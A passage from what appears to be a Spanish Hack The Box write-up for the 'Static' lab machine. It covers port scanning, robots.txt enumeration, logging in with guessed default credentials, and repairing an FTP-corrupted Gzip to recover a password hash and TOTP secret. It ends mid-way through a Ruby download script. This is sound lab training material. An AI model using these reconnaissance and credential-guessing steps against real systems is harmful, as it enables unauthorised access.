<!doctype html><html lang=es>
<head>
<title>Static | 7Rocky</title><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
<meta name=viewport content="width=device-width,minimum-scale=1">
<meta name=description content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web que expone un archivo Gzip corrupto que necesita ser corregido para obtener una clave de TOTP y descargar un archivo VPN. Luego, hay algunos servicios PHP vulnerables que pueden ser comprometidos para llegar a un servidor interno que contiene un archivo binario ejecutable que tiene una vulnerabilidad de Format String. Para comprometer esta máquina se necesitan conocimientos avanzados de pivoting y reenvío de puertos, además de enumeración web, explotación de PHP y explotación de Format String. En este write-up se utiliza un script personalizado de Ruby para automatizar el proceso de descarga del archivos VPN, un script de Python para ganar RCE sobre un servidor web PHP y otro script de Python para la explotación del binario mediante Format String">
<meta name=robots content="index, follow">
<meta name=image content="https://7rocky.github.io/images/HTB/Static/Static.png">
<meta name=author content="7Rocky">
<meta property="og:title" content="Static">
<meta property="og:description" content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web que expone un archivo Gzip corrupto que necesita ser corregido para obtener una clave de TOTP y descargar un archivo VPN. Luego, hay algunos servicios PHP vulnerables que pueden ser comprometidos para llegar a un servidor interno que contiene un archivo binario ejecutable que tiene una vulnerabilidad de Format String. Para comprometer esta máquina se necesitan conocimientos avanzados de pivoting y reenvío de puertos, además de enumeración web, explotación de PHP y explotación de Format String. En este write-up se utiliza un script personalizado de Ruby para automatizar el proceso de descarga del archivos VPN, un script de Python para ganar RCE sobre un servidor web PHP y otro script de Python para la explotación del binario mediante Format String">
<meta property="og:type" content="article">
<meta property="og:url" content="https://7rocky.github.io/htb/static/"><meta property="article:section" content="htb">
<meta property="article:published_time" content="2021-12-18T00:00:00+01:00">
<meta property="article:modified_time" content="2022-03-03T18:25:10+01:00"><meta property="og:site_name" content="7Rocky">
<meta property="og:image" content="https://7rocky.github.io/images/HTB/Static/Static.png">
<meta property="og:author" content="7Rocky">
<meta itemprop=name content="Static">
<meta itemprop=description content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web que expone un archivo Gzip corrupto que necesita ser corregido para obtener una clave de TOTP y descargar un archivo VPN. Luego, hay algunos servicios PHP vulnerables que pueden ser comprometidos para llegar a un servidor interno que contiene un archivo binario ejecutable que tiene una vulnerabilidad de Format String. Para comprometer esta máquina se necesitan conocimientos avanzados de pivoting y reenvío de puertos, además de enumeración web, explotación de PHP y explotación de Format String. En este write-up se utiliza un script personalizado de Ruby para automatizar el proceso de descarga del archivos VPN, un script de Python para ganar RCE sobre un servidor web PHP y otro script de Python para la explotación del binario mediante Format String"><meta itemprop=datePublished content="2021-12-18T00:00:00+01:00">
<meta itemprop=dateModified content="2022-03-03T18:25:10+01:00">
<meta itemprop=wordCount content="5703">
<meta itemprop=keywords content="ftp,cve,php,otp,pivoting,capabilities,path-hijacking,port-forwarding,binary-exploitation,format-string,">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Static">
<meta name=twitter:description content="Hack The Box. Linux. Máquina difícil. Esta máquina contiene una página web que expone un archivo Gzip corrupto que necesita ser corregido para obtener una clave de TOTP y descargar un archivo VPN. Luego, hay algunos servicios PHP vulnerables que pueden ser comprometidos para llegar a un servidor interno que contiene un archivo binario ejecutable que tiene una vulnerabilidad de Format String. Para comprometer esta máquina se necesitan conocimientos avanzados de pivoting y reenvío de puertos, además de enumeración web, explotación de PHP y explotación de Format String. En este write-up se utiliza un script personalizado de Ruby para automatizar el proceso de descarga del archivos VPN, un script de Python para ganar RCE sobre un servidor web PHP y otro script de Python para la explotación del binario mediante Format String">
<meta name=twitter:image content="https://7rocky.github.io/images/HTB/Static/Static.png">
<meta name=twitter:author content="7Rocky">
<script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script>
<link rel="shortcut icon" href=/images/favicon.ico type=image/x-icon>
<link href=/css/style.css rel=stylesheet>
<link href=/css/monokai-sublime.min.css rel=stylesheet>
<link href=/css/code.css rel=stylesheet>
<link href=/css/main.css rel=stylesheet>
<script src=/js/highlight.min.js></script>
<script>hljs.configure({ignoreUnescapedHTML:!0}),hljs.highlightAll()</script>
<script src=//mozilla.github.io/pdf.js/build/pdf.js></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script type=text/x-mathjax-config>MathJax.Hub.Config({messageStyle:'none',tex2jax:{displayMath:[['$$','$$']],inlineMath:[['$','$']],processEnvironments:!0,processEscapes:!0,skipTags:['noscript','pre','script','style','textarea'],TeX:{equationNumbers:{autoNumber:'AMS'},extensions:['AMSmath.js','AMSsymbols.js']}}})</script>
<script src=/js/main.js></script>
<div style=display:none>
$
\newcommand{\e}{e}
\newcommand{\N}[1][]{\mathbb{N}^{#1}}
\newcommand{\Q}[1][]{\mathbb{Q}^{#1}}
\newcommand{\R}[1][]{\mathbb{R}^{#1}}
\newcommand{\Z}[1][]{\mathbb{Z}^{#1}}
\newcommand{\C}[1][]{\mathbb{C}^{#1}}
\newcommand{\dx}{\,\mathrm{d}x}
\newcommand{\dy}{\,\mathrm{d}y}
\newcommand{\dz}{\,\mathrm{d}z}
\newcommand{\dt}{\,\mathrm{d}t}
\newcommand{\divides}{\, | \,}
\newcommand{\st}{\; | \;}
\renewcommand{\geq}{\geqslant}
\renewcommand{\leq}{\leqslant}
\renewcommand{\i}{\mathrm{i}}
\newcommand{\rank}{\mathop{\mathrm{rank}}}
\newcommand{\tr}{\mathop{\mathrm{tr}}}
\newcommand{\charField}{\mathop{\mathrm{char}}}
\newcommand{\Image}{\mathop{\mathrm{Im}}}
$
</div></head><body class="ma0 production">
<header>
<div class=bg-black>
<nav class="pv3 ph3 ph4-ns" role=navigation>
<div class="flex-l justify-between items-center center">
<a class="f3 fw2 hover-white no-underline white-90 dib" href=/ title=7Rocky>7Rocky</a>
<div class="flex-l items-center">
<a class="link-transition github link dib z-999 pt3 pt0-l mr3" href=/en/htb/static/ title=en>
<img alt=en height=32px src=/images/en.png width=32px>
</a>
<ul class="pl0 ml3 mr3">
<li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/ctf/ title=CTF>CTF</a>
</li><li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/htb/ title=HTB>HTB</a>
</li><li class="list f5 f4-ns fw4 dib pr3">
<a class="hover-white no-underline white-90" href=/imc/ title=IMC>IMC</a>
</li></ul><a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div></div></nav></div></header><main class=pb7 role=main>
<article class="flex-l flex-wrap justify-between mw8 center ph3">
<header class="mt4 w-100">
<aside aria-label=aside class="instapaper_ignoref b helvetica tracked">HTB</aside><div id=sharing class=mt3>
<a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/static/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
</a>
<a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/static/&text=Static" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
<a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/static/&title=Static" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</a>
</div><h1 class="f1 mt3 mb1">Static</h1><time class="f6 mv4 dib tracked" datetime=2021-12-18T00:00:00+01:00>18 / 12 / 2021</time>
</header><div class=htb-image>
<img alt=Static src=/images/HTB/Static/Static.png>
</div><ul class="nested-links tags">
<li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/ftp title=FTP>FTP</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/cve title=CVE>CVE</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/php title=PHP>PHP</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/otp title=OTP>OTP</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/pivoting title=Pivoting>Pivoting</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/capabilities title=Capabilities>Capabilities</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/path-hijacking title="PATH hijacking">PATH hijacking</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/port-forwarding title="Reenvío de puertos">Reenvío de puertos</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/binary-exploitation title="Explotación de binarios">Explotación de binarios</a>
</li><li class=list>
<a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href=/tags/format-string title="Vulnerabilidad de Format String">Vulnerabilidad de Format String</a>
</li></ul><aside aria-label=aside class="w-20-l mt6-l aside-mobile">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contenidos de este write-up</p><nav id=TableOfContents>
<ul>
<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li><li><a href=#enumeración-web>Enumeración web</a></li><li><a href=#parcheando-un-fichero-gzip>Parcheando un fichero Gzip</a></li><li><a href=#gestionando-2fa>Gestionando 2FA</a></li><li><a href=#conexión-a-la-vpn-de-static>Conexión a la VPN de Static</a></li><li><a href=#comprometiendo-un-servidor-interno>Comprometiendo un servidor interno</a></li><li><a href=#enumeración-de-red>Enumeración de red</a></li><li><a href=#comprometiendo-otro-servidor-interno>Comprometiendo otro servidor interno</a></li><li><a href=#encontrando-una-vulnerabilidad-de-_format-string_>Encontrando una vulnerabilidad de <em>Format String</em></a></li><li><a href=#configuración-de-red-para-la-explotación>Configuración de red para la explotación</a></li><li><a href=#explotación-de-_format-string_>Explotación de <em>Format String</em></a></li><li><a href=#escalada-de-privilegios-alternativa>Escalada de privilegios alternativa</a></li></ul></nav></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul>
<li>
<strong>SO</strong>: Linux
</li><li>
<strong>Dificultad</strong>: Difícil
</li><li>
<strong>Dirección IP</strong>: 10.10.10.246
</li><li>
<strong>Fecha</strong>: 19 / 06 / 2021
</li></ul><h2 id=escaneo-de-puertos>Escaneo de puertos</h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-plaintext data-lang=plaintext><span style=display:flex><span># Nmap 7.92 scan initiated as: nmap -sC -sV -Pn -o nmap/targeted 10.10.10.246 -p 22,2222,8080
</span></span><span style=display:flex><span>Nmap scan report for 10.10.10.246
</span></span><span style=display:flex><span>Host is up (0.044s latency).
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA)
</span></span><span style=display:flex><span>|   256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA)
</span></span><span style=display:flex><span>|_  256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519)
</span></span><span style=display:flex><span>2222/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
</span></span><span style=display:flex><span>| ssh-hostkey:
</span></span><span style=display:flex><span>|   2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA)
</span></span><span style=display:flex><span>|   256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA)
</span></span><span style=display:flex><span>|_  256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519)
</span></span><span style=display:flex><span>8080/tcp open  http    Apache httpd 2.4.38 ((Debian))
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.38 (Debian)
</span></span><span style=display:flex><span>|_http-title: Site doesn&#39;t have a title (text/html; charset=UTF-8).
</span></span><span style=display:flex><span>| http-robots.txt: 2 disallowed entries
</span></span><span style=display:flex><span>|_/vpn/ /.ftp_uploads/
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span># Nmap done -- 1 IP address (1 host up) scanned in 27.37 seconds
</span></span></code></pre></div><p>La máquina tiene abiertos los puertos 22, 2222 (SSH), 8080 (HTTP).</p><h2 id=enumeración-web>Enumeración web</h2><p>Si vamos a <code>http://10.10.10.246</code> utilizando un navegador web, veremos una página vacía. Mirando en la salida de <code>nmap</code>, descubrimos que hay un archivo <code>robots.txt</code> expuesto:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl 10.10.10.246:8080/robots.txt
</span></span><span style=display:flex><span>User-agent: *
</span></span><span style=display:flex><span>Disallow: /vpn/
</span></span><span style=display:flex><span>Disallow: /.ftp_uploads/
</span></span></code></pre></div><p>Y con esto tenemos dos rutas que probar. La página <code>http://10.10.10.246/vpn</code> muestra un simple formulario de inicio de sesión como el siguiente:</p><p><img src=/images/HTB/Static/Static-login.png alt="Static login"></p><p>Como se trata de un formulario muy sencillo, podemos probar también credenciales sencillas. Después de algunos intentos, vemos que <code>admin:admin</code> funciona. Sin embargo, el servicio tiene habilitado 2FA (Segundo Factor de Autenticación).</p><p><img src=/images/HTB/Static/Static-2fa.png alt="Static 2FA"></p><p>Dejemos esto por el momento y vayamos a <code>http://10.10.10.246/.ftp_uploads</code>. Como se puede ver, el listado de directorios está habilitado:</p><p><img src=/images/HTB/Static/Static-ftp-uploads.png alt="Static FTP uploads"></p><p>El fichero llamado <code>warning.txt</code> dice lo siguiente:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ curl http://10.10.10.246:8080/.ftp_uploads/warning.txt
</span></span><span style=display:flex><span>Binary files are being corrupted during transfer!!! Check if are recoverable.
</span></span></code></pre></div><p>Veamos si lo que dice es cierto. Si descargamos el archivo <code>db.sql.gz</code> y extraemos el fichero <code>db.sql</code>, obtendremos un error:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ 7z x db.sql.gz
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>Scanning the drive for archives:
</span></span><span style=display:flex><span>1 file, 262 bytes (1 KiB)
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Extracting archive: db.sql.gz
</span></span><span style=display:flex><span>--
</span></span><span style=display:flex><span>Path = db.sql.gz
</span></span><span style=display:flex><span>Type = gzip
</span></span><span style=display:flex><span>Headers Size = 17
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>ERROR: CRC Failed : db.sql
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Sub items Errors: 1
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Archives with Errors: 1
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Sub items Errors: 1
</span></span></code></pre></div><p>No obstante, <code>7z</code> es capaz de extraer el archivo <code>db.sql</code>, pero está corrupto:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>CREATE</span> <span style=color:#66d9ef>DATABASE</span> <span style=color:#66d9ef>static</span>;
</span></span><span style=display:flex><span>USE <span style=color:#66d9ef>static</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>CREATE</span> <span style=color:#66d9ef>TABLE</span> users ( id smallint unsignint  a<span style=color:#e6db74>&#39;n a)Co3 Nto_increment,sers name varchar(20) a&#39;</span>n a)Co, password varchar(<span style=color:#ae81ff>40</span>) a<span style=color:#e6db74>&#39;n a)Co, totp varchar(16) a&#39;</span>n a)Co, <span style=color:#66d9ef>primary</span> <span style=color:#66d9ef>key</span> (idS iaA;
</span></span><span style=display:flex><span><span style=color:#66d9ef>INSERT</span> INTOrs ( id smaers name vpassword vtotp vaS iayALUESsma, prim<span style=color:#e6db74>&#39;admin&#39;</span>im<span style=color:#e6db74>&#39;d05nade22ae348aeb5660fc2140aec35850c4da997m&#39;</span>d0orxxi4c7orxwwzlo<span style=color:#e6db74>&#39;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>IN
</span></span></span></code></pre></div><p>Por tanto, el mensaje era cierto. Tenemos que pensar en cómo arreglar este archivo Gzip.</p><h2 id=parcheando-un-fichero-gzip>Parcheando un fichero Gzip</h2><p>Como el directorio se llama <code>.ftp_uploads</code>, a lo mejor el archivo Gzip se subió por FTP pero en modo ASCII y no en modo binario. Podemos encontrar este problema realizando una búsqueda por Internet.</p><p>Lo que pasa es que FTP en modo ASCII transformará los caracteres de salto de línea (<code>\n</code>) a retorno de carro más salto de línea (<code>\r\n</code>), modificando el archivo y corrompiéndolo (en un archivo de texto, no habría cambio visual). La corrección es sencilla: solamente tenemos que encontrar <code>\r\n</code> en el archivo y reemplazarlo por <code>\n</code>.</p><p>Si mostramos el contenido del archivo Gzip corrupto en hexadecimal, vemos que hay cuatro ocurrencias de <code>\r\n</code> (en código ASCII hexadecimal, <code>\r</code> es 0x0d y <code>\n</code> es 0x0a):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-console data-lang=console><span style=display:flex><span>$ xxd db.sql.gz
</span></span><span style=display:flex><span>00000000: 1f8b 0808 ae8b eb5e 0003 6462 2e73 716c  .......^..db.sql
</span></span><span style=display:flex><span>00000010: 0055 8ec1 6ec2 3010 44ef f98a bd25 9138  .U..n.0.D....%.8
</span></span><span style=display:flex><span>00000020: 84c4 0920 4e86 fa80 84a8 4442 afd5 d676  ... N.....DB...v
</span></span><span style=display:flex><span>00000030: 8bd5 d846 b6d3 40bf be69 a902 9c76 a479  ...F..@..i...v.y
</span></span><span style=display:flex><span>00000040: 333b eb3d a30d 8327 dad0 15ad 19f8 8041  3;.=...&#39;.......A
</span></span><span style=display:flex><span>00000050: f165 74b8 d3eb 2b33 105b 069d 97ce 4302  .et...+3.[....C.
</span></span><span style=display:flex><span>00000060: 4a80 d7d8 b6ca 04e8 8c57 1f46 0d0a 3036  J........W.F..06
</span></span><span style=display:flex><span>00000070: 80e9 da16 b00b f655 19ee a496 264c fe52  .......U....&amp;L.R
</span></span><span style=display:flex><span>00000080: 06b5 842f 74fc 882e c9b3 74a4 2770 42ef  .../t.....t.&#39;pB.
</span></span><span style=display:flex><span>00000090: 7beb c468 9307 3bd8 701a ad69 f590 744a  {..h..;.p..i..tJ
</span></span><span style=display:flex><span>000000a0: a3bb c0a7 bc40 a244 0d0a e912 a2cd ae66  .....@.D.......f
</span></span><span style=display:flex><span>000000b0: fb06 36bb e6f9 6eef 6dc5 ede1 7f77 0d0a  ..6...n.m....w..
</span></span><span style=display:flex><span>000000c0: 2f74 7b60 f5c0 5d6b 6314 5a99 7810 222b  /t{`..]kc.Z.x.&#34;+
</span></span><span style=display:flex><span>000000d0: 0d0a 99e7 280b 3247 f956 5655 f6ce f329  ....(.2G.VVU...)
</span></span><span style=display:flex><span>000000e0: c950 f2a2 9c97 1927 0217 8bd9 2f6b ddf9  .P.....&#39;..../k..
</span></span><span style=display:flex><span>000000f0: ac08 9f0d b7ef bf5b 1b0f 6ba2 e807 eaf0  .......[..k.....
</span></span><span style=display:flex><span>00000100: 78b0 6301 0000                           x.c...
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>$ xxd db.sql.gz | grep -o 0d0a
</span></span><span style=display:flex><span>0d0a
</span></span><span style=display:flex><span>0d0a
</span></span><span style=display:flex><span>0d0a
</span></span><span style=display:flex><span>0d0a
</span></span></code></pre></div><p>Para parchear el archivo Gzip, decidí utilizar un simple <em>script</em> en Ruby que descarga el archivo, toma el contenido, reemplaza las ocurrencias de <code>\r\n</code> por <code>\n</code> y lo deposita en un archivo. Luego, podremos descomprimir el archivo parcheado sin errores. Esto también se puede hacer desde el propio <em>script</em> de Ruby con unas pocas líneas:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=language-ruby data-lang=ruby><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env ruby</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>require <span style=color:#e6db74>&#39;uri&#39;</span>
</span></span><span style=display:flex><span>require <span style=color:#e6db74>&#39;zlib&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>require <span style=color:#e6db74>&#39;net/http&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sql_file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;db.sql&#39;</span>
</span></span><span style=display:flex><span>gz_file <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>#{</span>sql_file<span style=color:#e6db74>}</span><span style=color:#e6db74>.gz&#34;</span>
</span></span><span style=display:flex><span>tmp <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;tmp_</span><span style=color:#e6db74>#{</span>gz_file<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;10.10.10.246:8080&#39;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>puts <span style=color:#e6db74>&#34;[*] Downloading corrupted </span><span style=color:#e6db74>#{</span>gz_file<span style=color:#e6db74>}</span><span style=color:#e6db74> file&#34;</span>
</span></span><span style=display:flex><span>
